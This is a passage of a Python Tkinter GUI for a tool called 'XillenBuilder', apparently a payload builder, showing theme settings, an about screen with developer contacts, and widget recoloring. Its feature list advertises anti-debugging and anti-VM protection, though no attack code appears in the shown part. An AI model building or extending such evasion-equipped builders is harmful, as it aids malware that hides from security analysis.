        # Основной контент - делаем красиво и полноценно
        content = tk.Frame(self.main_container, bg=COLORS['dark_bg'])
        content.pack(fill="both", expand=True)

        # Левая панель - настройки темы
        left_settings = tk.Frame(content, bg=COLORS['card_bg'], relief="flat", bd=1)
        left_settings.pack(side=tk.LEFT, fill="both", expand=True, padx=(0, 10))

        # Заголовок темы
        theme_header = tk.Frame(left_settings, bg=COLORS['darker_bg'])
        theme_header.pack(fill="x", pady=(0, 15))

        tk.Label(theme_header,
               text="Тема интерфейса",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg']).pack(pady=15)

        # Переключатель темы
        theme_frame = tk.Frame(left_settings, bg=COLORS['card_bg'])
        theme_frame.pack(fill="x", padx=20, pady=20)

        tk.Label(theme_frame,
               text="Выберите тему:",
               font=self.entry_font,
               fg=COLORS['text_light'],
               bg=COLORS['card_bg']).pack(anchor="w", pady=(0, 10))

        # Кнопки тем
        theme_buttons_frame = tk.Frame(theme_frame, bg=COLORS['card_bg'])
        theme_buttons_frame.pack(fill="x")

        def switch_to_deep_dark():
            print("Switching to deep_dark theme...")
            self.current_theme = "deep_dark"
            global COLORS
            COLORS = THEMES["deep_dark"]
            self.update_theme_colors()
            
        def switch_to_scarlet():
            print("Switching to scarlet theme...")
            self.current_theme = "scarlet"
            global COLORS
            COLORS = THEMES["scarlet"]
            self.update_theme_colors()

        deep_dark_btn = ProfessionalButton(theme_buttons_frame,
                                        text="Глубокий тёмный",
                                        command=switch_to_deep_dark,
                                        bg=COLORS['main_button_bg'] if self.current_theme == "deep_dark" else COLORS['button_bg'],
                                        fg=COLORS['main_button_fg'] if self.current_theme == "deep_dark" else COLORS['text_light'],
                                        hover_bg=COLORS['main_button_hover_bg'] if self.current_theme == "deep_dark" else COLORS['hover_bg'],
                                        hover_fg=COLORS['main_button_hover_fg'] if self.current_theme == "deep_dark" else COLORS['text_lighter'],
                                        font=self.button_font,
                                        padx=15,
                                        pady=8)
        deep_dark_btn.pack(side=tk.LEFT, padx=(0, 10))

        scarlet_btn = ProfessionalButton(theme_buttons_frame,
                                      text="Алый",
                                      command=switch_to_scarlet,
                                      bg=COLORS['main_button_bg'] if self.current_theme == "scarlet" else COLORS['button_bg'],
                                      fg=COLORS['main_button_fg'] if self.current_theme == "scarlet" else COLORS['text_light'],
                                      hover_bg=COLORS['main_button_hover_bg'] if self.current_theme == "scarlet" else COLORS['hover_bg'],
                                      hover_fg=COLORS['main_button_hover_fg'] if self.current_theme == "scarlet" else COLORS['text_lighter'],
                                      font=self.button_font,
                                      padx=15,
                                      pady=8)
        scarlet_btn.pack(side=tk.LEFT)

        # Правая панель - другие настройки
        right_settings = tk.Frame(content, bg=COLORS['card_bg'], relief="flat", bd=1)
        right_settings.pack(side=tk.RIGHT, fill="both", expand=True, padx=(10, 0))

        # Заголовок других настроек
        other_header = tk.Frame(right_settings, bg=COLORS['darker_bg'])
        other_header.pack(fill="x", pady=(0, 15))

        tk.Label(other_header,
               text="Другие настройки",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg']).pack(pady=15)

        # Содержимое других настроек
        other_content = tk.Frame(right_settings, bg=COLORS['card_bg'])
        other_content.pack(fill="both", expand=True, padx=20, pady=20)

        tk.Label(other_content,
               text="Скоро будут доступны:",
               font=self.entry_font,
               fg=COLORS['text_light'],
               bg=COLORS['card_bg']).pack(anchor="w", pady=(0, 10))

        features = [
            "• Настройки шрифтов",
            "• Параметры сборки", 
            "• Экспорт конфигурации",
            "• Импорт настроек"
        ]

        for feature in features:
            tk.Label(other_content,
                   text=feature,
                   font=self.entry_font,
                   fg=COLORS['text_light'],
                   bg=COLORS['card_bg']).pack(anchor="w", pady=2)

    def show_about_screen(self):
        """Показывает экран о программе"""
        # Очищаем контейнер
        for widget in self.main_container.winfo_children():
            widget.destroy()
            
        # Заголовок
        header = tk.Frame(self.main_container, bg=COLORS['card_bg'], relief="flat", bd=1)
        header.pack(fill="x", pady=(0, 20))

        title_frame = tk.Frame(header, bg=COLORS['card_bg'])
        title_frame.pack(padx=20, pady=15)

        tk.Label(title_frame,
               text="О программе",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['card_bg']).pack(side=tk.LEFT)

        # Кнопка назад
        back_btn = ProfessionalButton(title_frame,
                                    text="← Назад",
                                    command=lambda: self.show_screen("main"),
                                    bg=COLORS['button_bg'],
                                    fg=COLORS['text_light'],
                                    hover_bg=COLORS['hover_bg'],
                                    hover_fg=COLORS['text_lighter'],
                                    font=self.button_font,
                                    padx=15,
                                    pady=8)
        back_btn.pack(side=tk.RIGHT)
        
        # Основной контент с прокруткой
        main_content = tk.Frame(self.main_container, bg=COLORS['dark_bg'])
        main_content.pack(fill="both", expand=True)
        
        # Создаем Canvas для прокрутки
        canvas = tk.Canvas(main_content, bg=COLORS['dark_bg'], highlightthickness=0)
        scrollbar = tk.Scrollbar(main_content, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=COLORS['dark_bg'])
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        # Информационная карточка
        info_card = tk.Frame(scrollable_frame, bg=COLORS['card_bg'], relief="flat", bd=1)
        info_card.pack(fill="x", padx=20, pady=20)
        
        # Заголовок карточки
        card_header = tk.Frame(info_card, bg=COLORS['darker_bg'])
        card_header.pack(fill="x", pady=(20, 0), padx=20)
        
        tk.Label(card_header,
               text="Информация о программе",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg']).pack(pady=15)
        
        # Содержимое карточки
        card_content = tk.Frame(info_card, bg=COLORS['card_bg'])
        card_content.pack(fill="x", padx=20, pady=20)
        
        # Информация о команде разработчиков
        team_info = [
            ("Команда:", "XillenKillers", COLORS['accent']),
            ("Сайт:", "https://xillenkillers.ru/", COLORS['primary']),
            ("Telegram:", "@XillenAdapter", COLORS['primary']),
            ("Версия:", "3.0", COLORS['success']),
            ("Год:", YEAR, COLORS['progress'])
        ]

        for label, value, color in team_info:
            info_row = tk.Frame(card_content, bg=COLORS['card_bg'])
            info_row.pack(fill="x", pady=8)
            
            tk.Label(info_row,
                   text=label,
                   font=self.entry_font,
                   fg=COLORS['text_light'],
                   bg=COLORS['card_bg']).pack(side=tk.LEFT)
            
            tk.Label(info_row,
                   text=value,
                   font=self.entry_font,
                   fg=color,
                   bg=COLORS['card_bg']).pack(side=tk.RIGHT)

        # Разработчики
        dev_section = tk.Frame(scrollable_frame, bg=COLORS['card_bg'], relief="flat", bd=1)
        dev_section.pack(fill="x", padx=20, pady=(0, 20))
        
        dev_header = tk.Frame(dev_section, bg=COLORS['darker_bg'])
        dev_header.pack(fill="x", pady=(20, 0), padx=20)
        
        tk.Label(dev_header,
               text="Разработчики",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg']).pack(pady=15)
        
        dev_content = tk.Frame(dev_section, bg=COLORS['card_bg'])
        dev_content.pack(fill="x", padx=20, pady=20)

        developers = [
            ("XillenAdapter", "@XillenAdapter", COLORS['primary']),
            ("BengaminButton", "@BengaminButton", COLORS['primary']),
            ("GitHub", "https://github.com/BengaminButton", COLORS['accent'])
        ]

        for name, contact, color in developers:
            dev_row = tk.Frame(dev_content, bg=COLORS['card_bg'])
            dev_row.pack(fill="x", pady=5)
            
            tk.Label(dev_row,
                   text=f"• {name}:",
                   font=self.entry_font,
                   fg=COLORS['text_light'],
                   bg=COLORS['card_bg']).pack(side=tk.LEFT)
            
            tk.Label(dev_row,
                   text=contact,
                   font=self.entry_font,
                   fg=color,
                   bg=COLORS['card_bg']).pack(side=tk.LEFT, padx=(10, 0))

        # Функции
        features_section = tk.Frame(scrollable_frame, bg=COLORS['card_bg'], relief="flat", bd=1)
        features_section.pack(fill="x", padx=20, pady=(0, 20))
        
        features_header = tk.Frame(features_section, bg=COLORS['darker_bg'])
        features_header.pack(fill="x", pady=(20, 0), padx=20)
        
        tk.Label(features_header,
               text="Возможности",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg']).pack(pady=15)
        
        features_content = tk.Frame(features_section, bg=COLORS['card_bg'])
        features_content.pack(fill="x", padx=20, pady=20)

        features = [
            ("Кросс-платформенная поддержка", COLORS['success']),
            ("HTML отчет с дизайном", COLORS['accent']),
            ("Поддержка Linux/Windows/Mac", COLORS['primary']),
            ("Автоматическая установка зависимостей", COLORS['progress']),
            ("Защита от отладки и VM", COLORS['warning']),
            ("Профессиональный минималистичный интерфейс", COLORS['primary'])
        ]

        for feature, color in features:
            feature_row = tk.Frame(features_content, bg=COLORS['card_bg'])
            feature_row.pack(fill="x", pady=5)
            
            tk.Label(feature_row,
                   text=f"✓ {feature}",
                   font=self.entry_font,
                   fg=color,
                   bg=COLORS['card_bg']).pack(anchor="w")
        
        # Настройка прокрутки
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Привязываем прокрутку колесиком мыши
        def _on_mousewheel(event):
            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        canvas.bind_all("<MouseWheel>", _on_mousewheel)

    def switch_theme(self):
        """Меняет тему на следующую"""
        current_theme = self.current_theme
        themes = list(THEMES.keys())
        next_index = (themes.index(current_theme) + 1) % len(themes)
        self.current_theme = themes[next_index]
        self.update_colors()
        self.log(f"Тема изменена на: {self.current_theme}")

    def update_colors(self):
        """Обновляет цвета всех элементов интерфейса на основе текущей темы"""
        for widget in self.root.winfo_children():
            self._update_widget_colors(widget)

    def _update_widget_colors(self, widget):
        """Рекурсивно обновляет цвета для всех виджетов"""
        if isinstance(widget, tk.Frame):
            widget.configure(bg=COLORS['dark_bg']) # Основной фон
            for child in widget.winfo_children():
                self._update_widget_colors(child)
        elif isinstance(widget, tk.Label):
            widget.configure(bg=COLORS['dark_bg'], fg=COLORS['text_light'])
        elif isinstance(widget, tk.Button):
            widget.configure(bg=COLORS['button_bg'], fg=COLORS['text_light'], activebackground=COLORS['button_hover_bg'], activeforeground=COLORS['button_hover_fg'])
        elif isinstance(widget, tk.Entry):
            widget.configure(bg=COLORS['dark_bg'], fg=COLORS['text_lighter'], insertbackground=COLORS['accent'])
        elif isinstance(widget, tk.Checkbutton):
            widget.configure(bg=COLORS['dark_bg'], fg=COLORS['text_light'], selectcolor=COLORS['accent'], activebackground=COLORS['dark_bg'], activeforeground=COLORS['text_light'])
        elif isinstance(widget, tk.Text): # Для scrolledtext
            widget.configure(bg=COLORS['dark_bg'], fg=COLORS['accent'], insertbackground=COLORS['accent'])
        elif isinstance(widget, tk.Scrollbar):
            widget.configure(bg=COLORS['darker_bg'], troughcolor=COLORS['darker_bg'])
        elif isinstance(widget, tk.Toplevel): # Для диалогов
            widget.configure(bg=COLORS['card_bg'])
            for child in widget.winfo_children():
                self._update_widget_colors(child)

if __name__ == "__main__":
    try:
        root = tk.Tk()
        app = XillenBuilder(root)
        root.mainloop()
    except ImportError as e:
        print(f"Ошибка импорта: {e}")
        print("Для Arch Linux выполните: sudo pacman -S tk")
        sys.exit(1)
    except Exception as e:
        print(f"Критическая ошибка: {e}")
        sys.exit(1)